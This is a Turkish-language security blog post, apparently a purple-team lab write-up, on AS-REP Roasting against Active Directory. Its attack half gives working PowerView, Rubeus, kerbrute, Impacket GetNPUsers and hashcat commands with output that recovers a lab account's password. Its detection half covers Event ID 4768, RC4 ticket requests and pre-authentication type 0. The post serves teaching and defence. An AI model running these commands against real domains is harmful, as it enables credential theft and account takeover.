---
title: "Active Directory ASREPRoasting Attack - Purple Mode"
author: b1lal
categories: [Active Directory, Purple]
tags: [active directory, asreproasting, attack, security, pentesting, red team, ad, kerberos, password spraying, active directory, hashcat, kerbrute, rubeus]
render_with_liquid: false
description: "Bu yazıda Active Directory ortamlarında gerçekleştirilen ASREPRoasting saldırısını, nasıl yapıldığını ve bu saldırıya karşı nasıl korunabileceğimizi anlatacağım."
media_subpath: /images/active-directory-asreproasting/
layout: post
published: true  
lang: "tr"
image:
  path: asrep.png
  alt: "Active Directory AS-REPRoasting Attack"
---

Bu yazımda AD ortamlarında gerçekleştirilen AS-REPRoasting saldırısnı anlatacağım. AS-REPRoasting kerberos protokolü üzerinden gerçekleştirilen bir saldırı türüdür.

AS-REPRoasting saldırısının nasıl gerçekleştirildiğine gelmeden önce kerberos protokolünün nasıl çalıştığını anlamamız daha yararlı olacaktır.

## Kerberos Protokolü

Kerberos, Windows 2000'den bu yana domain hesapları için varsayılan kimlik doğrulama protokolüdür. Açık bir standarta sahiptir ve aynı standardı kullanan diğer sistemlerle birlikte çalışabilir. Karşılıklı kimlik doğrulaması yöntemiyle çalışmaktadır yani hem istemci hemde sunucu birbirlerini doğrular.

Kerberosta kullanıcıları parolaları ağ üzerinden iletilmez bunun yerine biletler kullanılır. Bu stateless doğrulama protololüne yönelik belirli başlı saldırılar bulunmaktadır.

Şimdi kerberosta kimlik doğrulamanın nasıl gerçekleştiğine bakalım.

### Kerberos Kimlik Doğrulama Süreci

Bu süreci aşağıdaki görsel üzerinden ele alalım.

![Kerberos Authentication](kerberos-auth.png)

Bir kullanıcı bir sisteme oturum açma isteği başlattığında, istemci bu isteği kullanıcının parolası ile şifreleyerek **KDC**'den bir bilet ister.

Peki ama **KDC** kimdir, nedir?

Açılımı **Key Distribution Center** olan KDC, domain controller üzerinde çalışan bir hizmettir. Kerberos protokolünün temel bileşenlerinden biridir ve kimlik doğrulama sürecinde kritik bir rol oynar.

Kullanıcının bileti isteme durumu **AS-REQ** olarak adlandırılır. Eğer **KDC**, istemciden gelen **AS-REQ** isteğini kullanıcının parolaso ile doğrularsa, istemciye **AS-REP** mesajını gönderir. Bu mesajın içeriğinde kullanıcının parolası ile şifrelenmiş bir bilet bulunur.

Bu biletin ismi **TGT** yani **Ticket Granting Ticket**'dır. TGT, kullanıcının kimliğini doğrulamak ve diğer hizmetlere erişim sağlamak için kullanılmaktadır.

Daha sonra istemci, aldığı TGT'yi Domain COntroller'a göndererek erişim sağlamak istediği hizmet için bir bilet talep eder. Bu talep etme sürecine **TGS-REQ** denir. Eğer KDC, istemcinin TGT'sini doğrularsa, istemciye **TGS-REP** mesajını gönderir. Bu mesajın içeriğinde kullanıcının parolası ile şifrelenmiş bir hizmet bileti bulunur ve bu biletle istemci, erişim sağlamak istediği hizmete erişebilir.

Bu sürece kerberos **pre-authentication** denir.

> Ek bilgi olarak kerberos protokolü 88 numaralı TCP ve UDP portlarını kullanır.

<br>

## **AS-REPRoasting Saldırısı**

**AS-REP Roasting** saldırısı, AD ortamlarında kerberos ön kimlik doğrulama özelliğinin kapalı olduğu kullanıcı hesaplarını hedef alarak gerçekleştirilen bir saldırıdır.

Bu saldırı aracılığıyla bir saldırgan hedef kullanıcıların parolalarının hash değerlerini herhangi bir parola olmadan elde edebilir ve bu hash değerlerini kullanarak parola kırma işlemleri gerçekleştirebilir.

Kerberos kimlik doğrulama sürecinin ilk adımı istemcinin AS-REQ isteği ile bir TGT talep etmesidir. Bu talep varsayılan olarak **Ön kimlik doğrulama (pre authentication)** gerektirir.


### Zafiyet Nasıl Ortaya Çıkıyor?

Normal durumda istemci, kullanıcının parolasındna türetilen gizli bir anahtarla bir zaman damgasını şifreleyerek KDC'ye gönderir. KDC, bu şifrelenmiş zaman damgasını kullanarak istemcinin kimliğini doğrular ve eğer doğrulama başarılı olursa, istemciye AS-REP mesajını gönderir.

Ancak eğer bir kullanıcı hesabı için **Do not require Kerberos pre-authentication** - *Kerberos ön kimlik doğrulamasını gerektirme* özelliği etkinleştirilmişse istemci, **AS-REQ** isteği sırasında şifrelenmiş bir zaman damgası göndermesi beklenmemektedir. Bu durumda KDC, istemcinin kimliğini doğrulamak için herhangi bir ön kimlik doğrulama bilgisi beklemez ve doğrudan **AS-REP** mesajını gönderir.

![Do not require Kerberos pre-authentication](kerberos-pre-auth.png)


### DONT_REQ_PREAUTH Tespiti

Yukarıdaki görselde de görüldüğü gibi **Do not require Kerberos pre-authentication** ayarı etkinleştirildiğinde UAC değeri **DONT_REQ_PREAUTH** olarak görünür.

UAC değeri **DONT_REQ_PREAUTH** olan kullanıcı hesaplarını listelemek için PowerView modülünün Get-DomainUser cmdlet'ini kullanabiliriz.

```powershell
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : bilal
userprincipalname  : bilal@evilcorp.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

Görüldüğü gibi **bilal** adlı kullanıcı hesabının UAC değeri **DONT_REQ_PREAUTH** olarak görünmektedir. Bu da bu kullanıcı hesabının AS-REPRoasting saldırısına karşı savunmasız olduğunu söylemektedir.

<br>

### AS-REPRoasting Saldırısının Gerçekleştirilmesi - local

Bu bilgileri elde ettikten sonra çevrim dışı şekilde parola kırma işlemimize uygun şekilde **AS-REP**'i alabilmek için RUbeus aracını kullanabiliriz.

> Bu saldırı için hedef kullanıcı hesabının parolasını bilmemiz gerekmemektedir. Sadece samaccountname bilinerek yapılabilir.

```powershell
PS C:\htb> .\Rubeus.exe asreproast /user:bilal /nowrap /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: AS-REP roasting

[*] Target User            : bilal
[*] Target Domain          : EVILCORP.LOCAL

[*] Searching path 'LDAP://ACADEMY-EA-DC01.EVILCORP.LOCAL/DC=EVILCORP,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=bilal))'
[*] SamAccountName         : bilal
[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=EVILCORP,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.EVILCORP.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'EVILCORP.LOCAL\bilal'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
     $krb5asrep$23$bilal@EVILCORP.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA
```

Bundan sonra tek yapmamız gereken hash değerini hashcat veya alternatif bir araç ile kırmak olacaktır.


### AS-REPRoasting Saldırısının Gerçekleştirilmesi - remote

Yukarıdaki işlemleri linux saldırı cihazımız üzerinden de **kerbrute** aracı ile gerçekleştirebiliriz.

```bash
b1lal@htb[/htb]$ kerbrute userenum -d evilcorp.local --dc 172.16.5.5 username.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop

2022/04/01 13:14:17 >  Using KDC(s):
2022/04/01 13:14:17 >   172.16.5.5:88

2022/04/01 13:14:17 >  [+] VALID USERNAME:   sbrown@evilcorp.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   jjones@evilcorp.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   tjohnson@evilcorp.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   jwilson@evilcorp.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   bdavis@evilcorp.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   njohnson@evilcorp.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   asanchez@evilcorp.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   dlewis@evilcorp.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:   ccruz@evilcorp.local
2022/04/01 13:14:17 >  [+] bilal has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$bilal@EVILCORP.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a
```

> Kerbrute varsayılan olarak **Do not require Kerberos pre-authentication** özelliği etkinleştirilmiş kullanıcı hesaplarını tespit eder ve hash değerlerini elde eder.


###  Impacket Get-NPUsers.py

AD pentest öğrenirken veya gerçekleştirirken ne kadar fazla yöntem bilinirse o kadar iyi ve bulunulan ortama göre ayak uydurulabilir, bu yüzden ek olarak impacket'in Get-NPUsers.py aracını da kullanarak bu saldırıyı gerçekleştirebiliriz.

```bash
b1lal@htb[/htb]$ GetNPUsers.py EVILCORP.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[-] User ajack@evilcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User adaniel@evilcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tjohnson@evilcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwilson@evilcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bdavis@evilcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User njohnson@evilcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User asanchez@evilcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dlewis@evilcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ccruz@evilcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$bilal@evilcorp.local@EVILCORP.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9
[-] User rramirez@evilcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwallace@evilcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jsantiago@evilcorp.local doesn't have UF_DONT_REQUIRE_PREAUTH set

<SNIP>
```

Bu sayede hem linux hemde windows ortamlarında nasıl bu saldırının gerçekleştirilebildiğini anlamış olduk şimdi şifre kırma işlemine geçebiliriz.

Bundan önce hangi hashcat modunu kullanacağımızı bilmemiz gerekmektedir. AS-REPRoasting saldırısında elde edilen hashler **Kerberos 5 AS-REP etype 23** formatındadır ve hashcat'te bu format **18200** numaralı modda kırılmaktadır.

```bash
b1lal@htb[/htb]$ hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5asrep$23$bilal@EVILCORP.LOCAL:d18650f4f4e0537e0188a6897a478c55$0978822dec13046712db7dc03f6c4de059a946485451aae98bb93dff8e3e64f3aa5614160f21a029c2b9437cb16e5e9da4a2870fec0596b09bada989d1f8057262ea40840e8d0f20313b4e9a40fa5e4f987ff404313227a7bffae748e07201369d48abb4727dfe1a9f09d50d7ee3aa5c13e4433e0f9217533ee0e74b02eb8907e13a208340728f794ed5103cb3e5c7915bf2f449afda41988ff48a356bf2be680a25931a8746a99ad3e757bfe097b852f72ceae1b74720c011cff7ec94cbb6456982f14da17213b3b27dfa1ad4c7b5c7120db0d70763549e5144f1f5ee2ac71ddfc4dca9d25d39737dc83b6bc60e0a0054fc0fd2b2b48b25c6ca:Welcome!00
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$bilal@EVILCORP.LOCAL:d18650f4f...25c6ca
Time.Started.....: Fri Apr  1 13:18:40 2022 (14 secs)
Time.Estimated...: Fri Apr  1 13:18:54 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   782.4 kH/s (4.95ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10506240/14344385 (73.24%)
Rejected.........: 0/10506240 (0.00%)
Restore.Point....: 10493952/14344385 (73.16%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: WellHelloNow -> W14233LTKM

Started: Fri Apr  1 13:18:37 2022
Stopped: Fri Apr  1 13:18:55 2022
```

Bu sayede **bilal** adlı kullanıcı hesabının parolasının **Welcome!00** olduğunu öğrenmiş olduk.


## Mavi takım gözünden AS-REP Roasting 

Bu saldırıyı mavi takım gözünden ele alabilmek için Hackthebox'ın **Sherlock** kategorisindeki **Campfire-2** senaryosunu ele alacağız.

Senaryo açıklaması bize gerekli bilgileri vermektedir.

> Forela's Network is constantly under attack. The security system raised an alert about an old admin account requesting a ticket from KDC on a domain controller. Inventory shows that this user account is not used as of now so you are tasked to take a look at this. This may be an AsREP roasting attack as anyone can request any user's ticket which has preauthentication disabled.


*Kurumsal ortamlarda dakikada binlerce kerberos olayları gerçekleşebilmektedir, bu nedenle nereye nasıl bakacağımızı iyi bilmemiz gerekmektedir.*


### Event ID 4768 

Bu olay bir kerberos kimlik doğrulama bileti talep edildiğinde DC tarafından olay günlüğüne kayıt edilir. (<a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768" target="_blank">Event ID 4768</a>)

![Event ID 4768](kerberos-tgt.png)

Şimdi senaryomuzdaki zip dosyasını indirip içerisindeki log dosyasını açarak bu olayları inceleyelim.

İlk olarak olay günlüğünde **Event ID 4768**'i arayarak başlayalım ve bir adet örneği ele alalım.

![Event ID 4768 Example](event-4768-example.png)

Administrator kullanıcısının bir bilet talep ettiğini ve hizmet adının *krbtgt* olduğunu görüyoruz. Bunun olağan bir işlem olduğunu söyleyebiliriz çünkü bir hesap giriş yaptığında *krbtgt*, kerberos kimlik doğrulamasını gerçekleştiren yerleşik evrensel bir AD hesabıdır ve bu hesaba ait biletler talep etmektedir. 

Şimdi olası bir saldırıyı normal işlemlerden nasıl ayırabiliriz bakalım:

Kerberos biletleri için varsayılan durumlarda, şifreleme türü **0x12** veya **0x11** olur. Ancak biz RC4 olan **0x17** şifreleme türünü görürsek bu durumu daha ayrıntılı olarak incelememiz gerekir çünkü bu şifreleme türünü kullanarak parola kırma işlemlerini oldukça hızlı bir şekilde gerçekleştirebilirler bu yüzden saldırganlar tarafından tercih edilmektedir. Bkz: <a href="https://system32.eventsentry.com/codes/field/Kerberos%20Encryption%20Types" target="_blank">Kerberos Encryption Types</a>

![RC4 Encryption Type](kerberos-enc-types.png)

> **Impacket ve Rubeus araçlar, RC4 şifreleme türünde biletler talep etmektedir.** 

Bu saldırıyı tespit etmeye çalışırken dikkat edilmesi gereken bir diğer nokta ise **Pre-Authentication** değerini filtrelemektir. **pre-authentication type = 0** şeklinde bir filtreleme yaparak bu saldırıya karşı savunmasız olan kullanıcı hesaplarının bilet talep edip etmediği de görülebilir.


Şimdi arama işlemine geçelim. Elimizde sadece bir adet log dosyası var ve bu dosya içerisinde **4768** olaylarını arayarak başlıyoruz.

![4768](4768.png)

Daha sonra **0x17** değerini bu çıkan sonuçlar içinde arayarak devam ediyoruz.

![Encryption Type](0x17.png)

Sonrakini bul seçeneğine basıp bastığımıda önümüze bir adet sonuç geliyor.

![AS-REPRoasting Detected](result.png)

Bu sonucun yukarıda bahsettiğimiz tüm kriterleri karşıladğını görüyoruz.

<br>

> Soruların çözümü buraya kadar olan kısımları anladıktan sonrası için kolay olacaktır. Başarılar! :)


<br>

<p style="font-weight:900; color: gray; font-size: 50px; text-align:center;">Teşekkürler <a href="https://www.linkedin.com/in/batuhan0/?lipi=urn%3Ali%3Apage%3Ad_flagship3_search_srp_people%3BLUebMIsyT%2Fy0mhB736RysA%3D%3D" target="_blank" rel="noopener noreferrer">@batuhaner</a></p>

<style>
  .center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
  }

  .wrap pre{
    white-space: pre-wrap;
  }

  .post-desc {
    font-family: 'Open Sans', sans-serif !important;
  }
</style>
